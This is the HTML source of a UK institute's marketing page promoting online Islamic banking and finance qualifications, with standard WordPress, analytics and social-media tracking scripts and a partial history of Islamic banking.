<!DOCTYPE html>
<!--[if lt IE 7]>
<html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en-US" prefix="og: http://ogp.me/ns#"> <![endif]-->
<!--[if IE 7]>
<html class="no-js lt-ie9 lt-ie8" lang="en-US" prefix="og: http://ogp.me/ns#"> <![endif]-->
<!--[if IE 8]>
<html class="no-js lt-ie9" lang="en-US" prefix="og: http://ogp.me/ns#"> <![endif]-->
<!--[if gt IE 8]><!-->
<html class=" js no-touch svg inlinesvg svgclippaths no-ie8compat" lang="en-US" prefix="og: http://ogp.me/ns#" id="ls-global"><!--<![endif]--><head>

    
    <meta charset="utf-8">

	<title>

		 Institute of Islamic Banking and Finance | AIMS UK
	</title>
            <link rel="icon" type="image/png" href="http://www.aims.education/wp-content/uploads/2014/09/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!--[if lte IE 9]>
    <script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->


	

    
	<link rel="alternate" type="application/rss+xml" title=" Feed" href="http://www.aims.education/feed/">

<!-- This site is optimized with the Yoast SEO plugin v2.3.5 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Institute of Islamic banking and finance is globally recognized since year 2005. It offers most convenient and flexible model for Islamic finance training">
<link rel="canonical" href="http://www.aims.education/islamic-banking-and-finance-institute/">
<link rel="publisher" href="http://plus.google.com/+AIMSEducationOnline">
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="AIMS (UK) Institute of Islamic Banking and Finance - Recognized since 2005">
<meta property="og:description" content="Institute of Islamic banking and finance is globally recognized since year 2005. It offers most convenient and flexible model for Islamic finance training">
<meta property="og:url" content="http://www.aims.education/islamic-banking-and-finance-institute/">
<meta property="article:publisher" content="https://www.facebook.com/aimseducationonline">
<meta property="og:image" content="http://www.aims.education/wp-content/uploads/2015/04/institute-of-islamic-banking-and-finance.jpg">
<meta name="twitter:card" content="summary">
<meta name="twitter:description" content="Institute of Islamic banking and finance is globally recognized since year 2005. It offers most convenient and flexible model for Islamic finance training">
<meta name="twitter:title" content="AIMS (UK) Institute of Islamic Banking and Finance - Recognized since 2005">
<meta name="twitter:site" content="@educationaims">
<meta name="twitter:image" content="http://www.aims.education/wp-content/uploads/2015/04/institute-of-islamic-banking-and-finance.jpg">
<meta name="twitter:creator" content="@educationaims">
<!-- / Yoast SEO plugin. -->

		<div class="fit-vids-style" id="fit-vids-style" style="display: none;">­<style>                 .fluid-width-video-wrapper {                   width: 100%;                                position: relative;                         padding: 0;                              }                                                                                       .fluid-width-video-wrapper iframe,          .fluid-width-video-wrapper object,          .fluid-width-video-wrapper embed {             position: absolute;                         top: 0;                                     left: 0;                                    width: 100%;                                height: 100%;                            }                                         </style></div><script async="" src="//www.google-analytics.com/analytics.js"></script><script async="" src="//connect.facebook.net/en_US/fbds.js"></script><script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/www.aims.education\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1"}};
			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length>3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="http://www.aims.education/wp-includes/js/wp-emoji-release.min.js?ver=4.3.1" type="text/javascript"></script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel="stylesheet" href="http://www.aims.education/wp-content/themes/Glider/inc/icons/css/icon-font-style.css?ver=4.3.1">
<link rel="stylesheet" href="http://www.aims.education/wp-content/plugins/siteorigin-panels/css/front.css?ver=2.2">
<link rel="stylesheet" href="http://www.aims.education/wp-content/plugins/LayerSlider/static/css/layerslider.css?ver=5.6.2">
<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:100,300,regular,700,900%7COpen+Sans:300%7CIndie+Flower:regular%7COswald:300,regular,700&amp;subset=latin%2Clatin-ext">
<link rel="stylesheet" href="http://www.aims.education/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.3">
<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Source+Sans+Pro%3A300%2C400%2C600%2C700%2C300italic%2C400italic%2C600italic%2C700italic&amp;subset=latin%2Clatin-ext&amp;ver=4.3.1">
<link rel="stylesheet" href="http://www.aims.education/wp-content/uploads/glider_fonts/lineicon/lineicon.css?ver=4.3.1">
<link rel="stylesheet" href="http://www.aims.education/wp-content/themes/Glider/assets/css/foundation.min.css">
<link rel="stylesheet" href="http://www.aims.education/wp-content/themes/Glider/assets/css/app.css">
<link rel="stylesheet" href="http://www.aims.education/wp-content/themes/Glider/assets/css/responsive.css">
<link rel="stylesheet" href="http://www.aims.education/wp-content/themes/Glider/assets/css/bbpress.css">
<link rel="stylesheet" href="http://www.aims.education/wp-content/themes/Glider/assets/css/jquery.isotope.css">
<link rel="stylesheet" href="http://www.aims.education/wp-content/themes/Glider/assets/css/flexslider.css">
<link rel="stylesheet" href="http://www.aims.education/wp-content/themes/Glider/assets/css/prettyPhoto.css">
<link rel="stylesheet" href="http://www.aims.education/wp-content/themes/Glider/css/options.css?1439111074">
<script type="text/javascript" src="https://www.google.com/jsapi?ver=4.3.1"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/plugins/LayerSlider/static/js/greensock.js?ver=1.11.8"></script>
<script type="text/javascript" src="http://www.aims.education/wp-includes/js/jquery/jquery.js?ver=1.11.3"></script>
<script type="text/javascript" src="http://www.aims.education/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/plugins/LayerSlider/static/js/layerslider.kreaturamedia.jquery.js?ver=5.6.2"></script>
<script type="text/javascript" src="http://www.aims.education/wp-content/plugins/LayerSlider/static/js/layerslider.transitions.js?ver=5.6.2"></script>
		<!--[if lte IE 7]>
			<link href="/home4/aims/public_html/wp-content/themes/Glider//inc/icons/icons.php/css/ie7.min.css" media="screen" rel="stylesheet" type="text/css">
		<![endif]-->
	<style type="text/css" media="all" id="siteorigin-panels-grids-wp_head">/* Layout 4097 */ #pg-4097-0 , #pg-4097-1 , #pg-4097-2 , #pg-4097-3 , #pg-4097-4 , #pg-4097-5 , #pg-4097-6 , #pl-4097 .panel-grid-cell .so-panel { margin-bottom:30px } #pgc-4097-1-0 { width:66.613% } #pgc-4097-1-1 { width:33.387% } #pg-4097-1 .panel-grid-cell , #pg-4097-3 .panel-grid-cell , #pg-4097-5 .panel-grid-cell , #pg-4097-6 .panel-grid-cell { float:left } #pgc-4097-3-0 , #pgc-4097-3-1 , #pgc-4097-5-0 , #pgc-4097-5-1 , #pgc-4097-6-0 , #pgc-4097-6-1 { width:50% } #pl-4097 .panel-grid-cell .so-panel:last-child { margin-bottom:0px } #pg-4097-1 , #pg-4097-3 , #pg-4097-5 , #pg-4097-6 { margin-left:-15px;margin-right:-15px } #pg-4097-1 .panel-grid-cell , #pg-4097-3 .panel-grid-cell , #pg-4097-5 .panel-grid-cell , #pg-4097-6 .panel-grid-cell { padding-left:15px;padding-right:15px } @media (max-width:780px){ #pg-4097-0 .panel-grid-cell , #pg-4097-1 .panel-grid-cell , #pg-4097-2 .panel-grid-cell , #pg-4097-3 .panel-grid-cell , #pg-4097-4 .panel-grid-cell , #pg-4097-5 .panel-grid-cell , #pg-4097-6 .panel-grid-cell , #pg-4097-7 .panel-grid-cell { float:none;width:auto } #pgc-4097-1-0 , #pgc-4097-3-0 , #pgc-4097-5-0 , #pgc-4097-6-0 { margin-bottom:30px } #pl-4097 .panel-grid { margin-left:0;margin-right:0 } #pl-4097 .panel-grid-cell { padding:0 }  } </style>
    
    <style type="text/css">
        body {
                                }

        
            </style>
        

<!-- Facebook Remarketing Tag -->
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '388340451335339']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript>&lt;img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=388340451335339&amp;ev=PixelInitialized" /&gt;</noscript>


<!-- Google Analytics Tag -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-55115582-1', 'auto');
  ga('require', 'displayfeatures');
  ga('send', 'pageview');

</script>

<link rel="stylesheet" href="http://www.aims.education/wp-content/plugins/LayerSlider/static/skins/fullwidth/skin.css" type="text/css"></head>


<body class="page page-id-4097 page-parent page-template page-template-page-custom page-template-page-custom-php siteorigin-panels islamic-banking-and-finance-institute sticky-menu-on">


<div id="change_wrap_div" class="  ">

    
    
<section id="header" class="horizontal">

    <div class="row">

        <div class="twelve columns">

	        <div id="logo">			        <a href="http://www.aims.education/">
				        <img class="normal" src="http://www.aims.education/wp-content/uploads/2015/08/Logo-AIMS-Small1-c.png" alt="">
				        			        </a>
		        </div>

	        <form role="search" method="get" id="searchform" class="form-search" action="http://www.aims.education/">
                <label class="hide" for="s">Search for:</label>
                <input type="text" value="" name="s" id="s" class="s-field" placeholder="Enter request...">
                <input type="submit" id="searchsubmit" value=" " class="s-submit">

                <div class="cl"></div>
            </form>

            <div class="soc-head-icons">

                            </div>

            
                <div class="topp_links"><a href="http://www.aims.education/login/">Student Login</a> | <a href="http://www.aims.education/contact-us/">Contact Us</a> </div>
                
                    
                
                
                    </div>
    </div>

	
    <div class="header-navi-wrap crum_start_animation" style="z-index: 1000;">
        <div class="header-navi">
            <div class="header-navi-inner" data-menu-name="Menu">

	            <div id="small-logo">			         
                        <a href="http://www.aims.education/">
				           
                            <img src="http://www.aims.education/wp-content/uploads/2015/08/Logo-AIMS-Small1-c.png" alt="">
			         
                        </a>
		           
                    </div>
	            	          
                <ul id="menu-aims-topmenu" class="menu-primary-navigation">
                    <li class="showhide" style="display: none;">
                        <span class="title">Menu</span><span class="icon">
                            <em></em>
                            <em></em>
                            <em></em>
                            <em></em>
                        </span>
                    </li>
                    <li id="nav-menu-item-8028" class="nav-item menu-item-depth-0  has-icon" style="">
                        <a title="Areas of Study" href="#" class="menu-link main-menu-link">
                            <i class="linecon-graduation-cap"></i>
                            <span class="name"> Departments</span>
                            <span class="desc"> Areas of Study</span>
                            <span class="indicator">
                                <i class="awesome-angle-down"></i></span></a>
                                
<ul class="menu-depth-1 dropdown" style="display: none;">
	<li id="nav-menu-item-8036" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/project-management-institute/" class="menu-link sub-menu-link"><i class="linecon-cog"></i><span class="name"> Project Management</span></a></li>
	<li id="nav-menu-item-8037" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/supply-chain-management-institute/" class="menu-link sub-menu-link"><i class="linecon-truck"></i><span class="name"> Supply Chain Management</span></a></li>
	<li id="nav-menu-item-8027" class="sub-nav-item menu-item-depth-1  has-icon active "><a href="http://www.aims.education/islamic-banking-and-finance-institute/" class="menu-link sub-menu-link"><i class="linecon-money"></i><span class="name"> Islamic Banking and Finance</span></a></li>
</ul>
</li>

<li id="nav-menu-item-8043" class="nav-item menu-item-depth-0  has-icon" style="">
    <a title="&amp; Information" href="#" class="menu-link main-menu-link">
        <i class="linecon-thumbs-up"></i>
        <span class="name"> Features</span>
        <span class="desc"> &amp; Information</span>
        <span class="indicator">
            <i class="awesome-angle-down"></i>
        </span></a>
    
<ul class="menu-depth-1 dropdown" style="display: none;">
	<li id="nav-menu-item-8345" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/learning-methodology/" class="menu-link sub-menu-link"><i class="linecon-desktop"></i><span class="name"> Learning Methodology</span></a></li>
	<li id="nav-menu-item-8042" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/student-testimonials/" class="menu-link sub-menu-link"><i class="linecon-thumbs-up"></i><span class="name"> What Our Students Say!</span></a></li>
	<li id="nav-menu-item-8044" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/clients-participants/" class="menu-link sub-menu-link"><i class="linecon-globe"></i><span class="name"> Clients and Participants</span></a></li>
	<li id="nav-menu-item-11407" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/online-lectures/" class="menu-link sub-menu-link"><i class="linecon-user"></i><span class="name"> Free Lectures</span></a></li>
	<li id="nav-menu-item-11241" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/alumni/" class="menu-link sub-menu-link"><i class="linecon-graduation-cap"></i><span class="name"> Alumni</span></a></li>
	<li id="nav-menu-item-11322" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/blog/" class="menu-link sub-menu-link"><i class="linecon-note"></i><span class="name"> Blog</span></a></li>
	<li id="nav-menu-item-11002" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/news/" class="menu-link sub-menu-link"><i class="linecon-megaphone"></i><span class="name"> News</span></a></li>
	<li id="nav-menu-item-11003" class="sub-nav-item menu-item-depth-1  has-icon"><a href="http://www.aims.education/jobs/" class="menu-link sub-menu-link"><i class="linecon-lightbulb"></i><span class="name"> Job</span></a></li>
</ul>
</li>
<li id="nav-menu-item-8038" class="nav-item menu-item-depth-0  has-icon" style=""><a title="Offer Our Programs" href="http://www.aims.education/international-partnership-program/" class="menu-link main-menu-link"><i class="linecon-globe"></i><span class="name"> Partner With Us</span><span class="desc"> Offer Our Programs</span></a></li>
<li id="nav-menu-item-8715" class="nav-item menu-item-depth-0  has-icon" style=""><a title="Online Application" href="http://www.aims.education/enrollment-application/" class="menu-link main-menu-link"><i class="linecon-pencil"></i><span class="name"> Enroll Now</span><span class="desc"> Online Application</span></a></li>
</ul>                
                <div class="cl"></div>
            </div>
        </div>
    </div>
    <div></div>
</section>
    

<section id="layout" class="no-title">
    <div class="row">
        <div class="twelve columns">

        
  <div id="pl-4097">
      <div class="panel-grid" id="pg-4097-0">
          <div class="panel-grid-cell" id="pgc-4097-0-0">
              <div class="so-panel widget widget_layerslider_widget layerslider_widget panel-first-child" id="panel-4097-0-0-0">
                  <script data-cfasync="false" type="text/javascript">var lsjQuery = jQuery;</script>
                  <script data-cfasync="false" type="text/javascript">
lsjQuery(document).ready(function() {
if(typeof lsjQuery.fn.layerSlider == "undefined") { lsShowNotice('layerslider_5','jquery'); }
else {
lsjQuery("#layerslider_5").layerSlider({responsive: false, responsiveUnder: 940, layersContainer: 900, startInViewport: false, pauseOnHover: false, twoWaySlideshow: true, skin: 'fullwidth', hoverPrevNext: false, showCircleTimer: false, lazyLoad: false, cbInit: function(element) { }, cbStart: function(data) { }, cbStop: function(data) { }, cbPause: function(data) { }, cbAnimStart: function(data) { }, cbAnimStop: function(data) { }, cbPrev: function(data) { }, cbNext: function(data) { }, skinsPath: 'http://www.aims.education/wp-content/plugins/LayerSlider/static/skins/'})
}
});
</script>
<div class="ls-wp-fullwidth-container" style="height:400px;">
    <div class="ls-wp-fullwidth-helper" style="width: 1287px; height: 400px; left: -53.5px;">
        <div id="layerslider_5" class="ls-wp-container ls-container ls-fullwidth" style="width: 1287px; height: 400px; margin: 0px auto; visibility: visible;">
            <div class="ls-inner" style="width: 1287px; height: 400px; background-color: rgba(0, 0, 0, 0);">
                <div class="ls-lt-container ls-overflow-hidden" style="width: 1287px; height: 400px; display: block;">
                    <div class="ls-curtiles" style="overflow: hidden;"><img src="http://www.aims.education/wp-content/uploads/2015/08/ibf-slider-3-c.jpg" style="width: 1287px; height: 406.26px; margin-left: 0px; margin-top: -3.13014px;"></div>
                    <div class="ls-nexttiles">
                        <div class="ls-lt-tile" style="width: 1287px; height: 400px; overflow: visible;">
                            <div class="ls-nexttile" style="top: 0px; left: 0px; opacity: 1; transform: matrix(1, 0, 0, 1, 0, 0);"><img src="http://www.aims.education/wp-content/uploads/2015/08/ibf-slider-4-c.jpg" style="width: 1287px; height: 406.26px; margin-left: 0px; margin-top: -3.13014px;">
                            </div></div></div></div>
                        <div class="ls-slide ls-slide-1" data-ls="slidedelay:7000; transition2d: all;" style="width: 0px; height: 400px; visibility: visible; display: none; left: 0px; right: auto; top: 0px; bottom: auto;">
                            <img src="http://www.aims.education/wp-content/uploads/2015/08/ibf-slider-1-c.jpg" class="ls-bg ls-preloaded" alt="Islamic banking" style="padding: 0px; border-width: 0px; width: 1287px; height: 406.26px; margin-left: 0px; margin-top: -3.13014px; visibility: hidden;">
                            <div class="ls-gpuhack" style="width: auto; height: auto; padding: 0px; border-width: 0px; left: 193.5px; top: 0px;">
                            </div>
                       </div>
                
                <div class="ls-slide ls-slide-2" data-ls=" transition2d: all;" style="width: 0px; height: 400px; visibility: visible; display: none; left: 0px; right: auto; top: 0px; bottom: auto;"><img src="http://www.aims.education/wp-content/uploads/2015/08/ibf-slider-2-c.jpg" class="ls-bg ls-preloaded" alt="Islamic banking and finance" style="padding: 0px; border-width: 0px; width: 1287px; height: 406.26px; margin-left: 0px; margin-top: -3.13014px; visibility: hidden;">
                    <div class="ls-gpuhack" style="width: auto; height: auto; padding: 0px; border-width: 0px; left: 193.5px; top: 0px;"></div></div>
                <div class="ls-slide ls-slide-3" data-ls=" transition2d: all;" style="width: 0px; height: 400px; visibility: visible; display: none; left: 0px; right: auto; top: 0px; bottom: auto;"><img src="http://www.aims.education/wp-content/uploads/2015/08/ibf-slider-3-c.jpg" class="ls-bg ls-preloaded" alt="Islamic finance" style="padding: 0px; border-width: 0px; width: 1287px; height: 406.26px; margin-left: 0px; margin-top: -3.13014px; visibility: hidden;">
                    <div class="ls-gpuhack" style="width: auto; height: auto; padding: 0px; border-width: 0px; left: 193.5px; top: 0px;"></div></div><div class="ls-slide ls-slide-4 ls-active" data-ls=" transition2d: all;" style="width: 1287px; height: 400px; left: auto; right: 0px; top: 0px; bottom: auto; visibility: visible; display: none;"><img src="http://www.aims.education/wp-content/uploads/2015/08/ibf-slider-4-c.jpg" class="ls-bg ls-preloaded" alt="Islamic banking finance" style="padding: 0px; border-width: 0px; width: 1287px; height: 406.26px; margin-left: 0px; margin-top: -3.13014px; visibility: visible;"><div class="ls-gpuhack" style="width: auto; height: auto; padding: 0px; border-width: 0px; left: 193.5px; top: 0px;"></div></div></div><div class="ls-loading-container" style="z-index: -1; display: none;"><div class="ls-loading-indicator"></div></div><a class="ls-nav-prev" href="#" style="visibility: visible;"></a><a class="ls-nav-next" href="#" style="visibility: visible;"></a><div class="ls-bottom-nav-wrapper" style="visibility: visible;"><a class="ls-nav-start ls-nav-start-active" href="#"></a><span class="ls-bottom-slidebuttons"><a href="#" class=""></a><a href="#" class=""></a><a href="#" class=""></a><a href="#" class="ls-nav-active"></a><div class="ls-thumbnail-hover" style="width: 100px; height: 60px;"><div class="ls-thumbnail-hover-inner" style="visibility: hidden; display: block;"><div class="ls-thumbnail-hover-bg"></div><div class="ls-thumbnail-hover-img" style="width: 100px; height: 60px;"><img style="height: 60px;"></div><span></span></div></div></span><a class="ls-nav-stop" href="#"></a></div><div class="ls-shadow"></div></div></div></div></div><div class="so-panel widget widget_text widget_text panel-last-child" id="panel-4097-0-0-1">        
                        <div class="textwidget"><h1 style="margin-top:0px;margin-bottom:7px;">Institute of Islamic Banking and Finance</h1>
<h2 style="margin-top:0px;margin-bottom:21px;"><i>Globally Accredited Islamic Finance Qualifications</i></h2>
<p>Islamic Banking and Finance is now trillions of dollars industry, with the yearly growth rate above 20%. It is also one of the most essential needs of Muslims around the globe. Muslim population is now 24% of total world’s population, and this percentage is expected to reach 35% by year 2050 to outnumber the population of any other religion. Demand for qualified human resources is also growing and it is now higher than ever. Financial institutions now require more than 15,000 professionals a year to join the industry, worldwide. Academy for International Modern Studies (AIMS) is a UK based institute of Islamic banking and finance. It is among the pioneers of Islamic finance training and it has made a significant contribution for the industry. AIMS earned its strong reputation since its founding in the year 2005. AIMS offer best Islamic finance training and the qualified professionals are in high demand. They are trained to perform leading roles in the establishment and management of Islamic financial institutions.</p>
<p><b>Institute of Islamic Banking and Finance</b> has been working with renowned Islamic finance scholars and practitioners. They prepared globally accredited PhD, MBA, Diploma and Certificate programs. Islamic finance training programs at AIMS are designed by considering the need of today's business growth. Its objectives are to:</p>
<ul class="styled-list">
<li>Facilitate individuals become industry experts, and organization establish better Islamic financial system.</li>
<li>Promote best practices and professionalism in the Islamic finance industry.</li>
<li>Provide the best qualification in a world of increasing competition.</li>
</ul>
</div>
        </div></div></div><div class="panel-grid" id="pg-4097-1"><div class="panel-grid-cell" id="pgc-4097-1-0"><div class="so-panel widget widget_siteorigin-panels-embedded-video widget_siteorigin-panels-embedded-video panel-first-child panel-last-child" id="panel-4097-1-0-0"><div class="siteorigin-fitvids"><div class="entry-content-asset"><div class="fluid-width-video-wrapper" style="padding-top: 56.2222%;"><iframe src="https://www.youtube.com/embed/oswW9k4jYOw?feature=oembed" frameborder="0" allowfullscreen="" id="fitvid891231"></iframe></div></div></div></div></div><div class="panel-grid-cell" id="pgc-4097-1-1"><div class="so-panel widget widget_crum_block_button widget_crum_block_button panel-first-child panel-last-child" id="panel-4097-1-1-0"><div class="al-center info-butt"><h2></h2><p><br>
<img border="0" src="http://www.aims.education/wp-content/uploads/2015/08/islamic-finance-training.jpg" width="373" height="294" alt="islamic finance training"></p><a class="button" href="http://www.aims.education/islamic-banking-and-finance-study-notes/">TRY FREE LECTURES NOW</a></div></div></div></div><div class="panel-grid" id="pg-4097-2"><div class="panel-grid-cell" id="pgc-4097-2-0"><div class="so-panel widget widget_text widget_text panel-first-child panel-last-child" id="panel-4097-2-0-0">        <div class="textwidget"><h2 style="margin-top:0px;margin-bottom:21px;"><i>Islamic Finance Training Programs</i></h2>
<p>Considering the growing demand for skilled Islamic finance professionals, institute of Islamic banking and finance was launched in the year 2005. Institute of Islamic banking and finance at AIMS provides university level education, which is well-recognized. Leading scholars from all over the world are associated with AIMS, to produce highly skilled Islamic finance work force. AIMS scholars prepared the best <b>Islamic finance training</b> programs. Thousands of graduates who completed their education from AIMS, are now offering their services to well known organizations.</p>
<p>One must attend AIMS' Islamic finance training program, which is the fastest way to do the mastery in this subject. Programs offered by the institute of Islamic banking and finance are very popular among the job seekers. Programs equally suitable for those graduates who are seeking jobs, and for working professionals who are seeking career growth. They are well structured and are recognized among the financial institutions all over the world. The programs offered by the institute of Islamic banking and finance are hundred percent online. Lectures can easily be managed between the work and family.</p>
</div>
        </div></div></div><div class="panel-grid" id="pg-4097-3"><div class="panel-grid-cell" id="pgc-4097-3-0"><div class="so-panel widget widget_crum_block_button widget_crum_block_button panel-first-child" id="panel-4097-3-0-0"><div class="al-center info-butt"><h2></h2><p></p><div class="entry-thumb" style="margin-bottom:0;">
<img border="0" src="http://www.aims.education/wp-content/uploads/2015/08/islamic-finance-qualification-01.jpg" width="760" height="407" alt="islamic finance qualification"><p></p>
<span class="hover-box"><a href="http://www.aims.education/islamic-banking-and-finance-certification-courses/" class="more-link" style="margin-right: -20px;"> </a>
<a href="http://www.aims.education/wp-content/uploads/2015/08/islamic-finance-qualification-01.jpg" width="760" height="407" alt="islamic finance qualification" class="zoom-link" style="display:none;"> </a>
</span>
</div>

<p>CIFE is a globally recognized <a href="http://www.aims.education/islamic-banking-and-finance-certification-courses/">Islamic finance certification</a>. It is designed to produce experts, so they can skilfully work with Islamic finance companies, across the globe.</p>

<p></p><a class="button" href="http://aims.education/islamic-banking-and-finance-certification-courses/">READ MORE</a></div></div><div class="so-panel widget widget_crum_block_button widget_crum_block_button panel-last-child" id="panel-4097-3-0-1"><div class="al-center info-butt"><h2></h2><p></p><div class="entry-thumb" style="margin-bottom:0;">
<img border="0" src="http://www.aims.education/wp-content/uploads/2015/08/institute-of-islamic-banking-and-finance.jpg" width="760" height="407" alt="institute of islamic banking and finance"><p></p>
<span class="hover-box"><a href="http://www.aims.education/islamic-banking-and-finance-mba-masters-degree/" class="more-link" style="margin-right: -20px;"> </a>
<a href="http://www.aims.education/wp-content/uploads/2015/08/institute-of-islamic-banking-and-finance.jpg" width="760" height="407" alt="institute of islamic banking and finance" class="zoom-link" style="display:none;"> </a>
</span>
</div>

<p>It is an <a href="http://www.aims.education/islamic-banking-and-finance-mba-masters-degree/"> Islamic finance degree</a> program. It broaden the knowledge in business management principles. It also build expertise, required to develop the products</p><p></p><a class="button" href="http://aims.education/islamic-banking-and-finance-mba-masters-degree/">READ MORE</a></div></div></div><div class="panel-grid-cell" id="pgc-4097-3-1"><div class="so-panel widget widget_crum_block_button widget_crum_block_button panel-first-child" id="panel-4097-3-1-0"><div class="al-center info-butt"><h2></h2><p></p><div class="entry-thumb" style="margin-bottom:0;">
<img border="0" src="http://www.aims.education/wp-content/uploads/2015/08/islamic-banking-training.jpg" width="760" height="407" alt="Islamic banking training"><p></p>
<span class="hover-box"><a href="http://www.aims.education/islamic-banking-and-finance-diploma/" class="more-link" style="margin-right: -20px;"> </a>
<a href="http://www.aims.education/wp-content/uploads/2015/08/islamic-banking-training.jpg" width="760" height="407" alt="Islamic banking training" class="zoom-link" style="display:none;"> </a>
</span>
</div>

<p>MDIF is an advanced <a href="http://www.aims.education/islamic-banking-and-finance-diploma/">diploma Islamic finance</a> program. It is designed to produce professionals, who can perform leading roles to develop the institutions</p><p></p><a class="button" href="http://aims.education/islamic-banking-and-finance-diploma/">READ MORE</a></div></div><div class="so-panel widget widget_crum_block_button widget_crum_block_button panel-last-child" id="panel-4097-3-1-1"><div class="al-center info-butt"><h2></h2><p></p><div class="entry-thumb" style="margin-bottom:0;">
<img border="0" src="http://www.aims.education/wp-content/uploads/2015/08/Islamic-finance-university.jpg" width="760" height="407" alt="Islamic finance university"><p></p>
<span class="hover-box"><a href="http://www.aims.education/islamic-banking-and-finance-phd/" class="more-link" style="margin-right: -20px;"> </a>
<a href="http://www.aims.education/wp-content/uploads/2015/08/Islamic-finance-university.jpg" width="760" height="407" alt="Islamic finance university" class="zoom-link" style="display:none;"> </a>
</span>
</div>

<p><a href="http://www.aims.education/islamic-banking-and-finance-phd/">PhD Islamic Finance</a> is made to produce industry leader. It allow candidates to integrate their skills, knowledge, and education-research to policy.</p><p></p><a class="button" href="http://aims.education/islamic-banking-and-finance-phd/">READ MORE</a></div></div></div></div><div class="panel-grid" id="pg-4097-4"><div class="panel-grid-cell" id="pgc-4097-4-0"><div class="so-panel widget widget_text widget_text panel-first-child" id="panel-4097-4-0-0"><h3 class="widget-title" style="content: inherit;"><i class="linecon-graduation-cap"></i>Growing Demand of Islamic Finance</h3>        <div class="textwidget"><ul class="styled-list">
<li>Islamic finance is also popular among non-Muslims, due to many reasons. One of the major reason is that it condemns Usury. Usury is also strictly forbidden in Judaism, Christianity, Buddhism, and Hinduism.</li>
<li>Islamic finance is an ethical and moral financial system. It totally condemns taking advantage of others misfortunes.</li>
<li>Due to all these facts, Islamic Banking and Finance is now trillions of dollars industry. The yearly growth rate of Islamic banking and finance industry is above 20%.</li>
<li>Demand for a reputed institute of Islamic banking and finance, and qualified human resources is also growing. Islamic finance training need is now higher than ever. Islamic banks and financial institutions require at least 15,000 professionals a year to join the industry. Need for qualified professionals is increasing rapidly, on yearly basis.</li>
</ul>
<p></p>
<p align="center"><img border="0" src="http://www.aims.education/wp-content/uploads/2015/08/islamic-finance-qualification.jpg" width="1000" height="409" alt="Islamic finance qualifications"></p>
</div>
        </div><div class="so-panel widget widget_text widget_text panel-last-child" id="panel-4097-4-0-1"><h3 class="widget-title" style="content: inherit;"><i class="linecon-graduation-cap"></i>History of Islamic Banking</h3>        <div class="textwidget"><p>Before you get to know about the details of the Islamic finance training programs offered by the institute of Islamic banking and finance.  Let us first give you a background of Islamic banking and finance. </p>
<ul class="styled-list">
<li>Mostly, what people wants to know about Islamic Banking is, where it came from? Is it really Islamic? and was there a concept of banking, at the time of Prophet Mohammed (Peace Be Upon Him)? Here, we are going to answer all these questions.</li>
<li>The origins of Islamic Finance can be traced back from the time of Prophet Mohammed (Peace Be Upon Him). Trading was the main source of income of the people living in Makkah. In Makkah, Prophet Mohammed (Peace Be Upon Him) used to carry out merchandise to Syria on the basis of business partnership.</li>
